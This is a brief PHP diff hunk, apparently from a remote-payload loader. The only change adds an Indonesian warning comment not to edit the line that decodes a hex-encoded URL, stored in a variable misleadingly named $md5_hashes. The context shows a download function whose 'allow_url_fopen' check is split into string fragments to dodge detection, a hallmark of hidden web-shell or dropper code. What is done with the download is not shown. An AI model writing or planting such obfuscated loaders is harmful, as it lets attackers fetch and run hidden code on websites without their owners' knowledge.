@@ -10,7 +10,7 @@ function hex2str($hex) {
     return $str;
 }
 
-$url = hex2str($md5_hashes);
+$url = hex2str($md5_hashes); # Jangan Edit bangian sini kalo tidak mau error
 
 function downloadWithFileGetContents($url) {
     if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
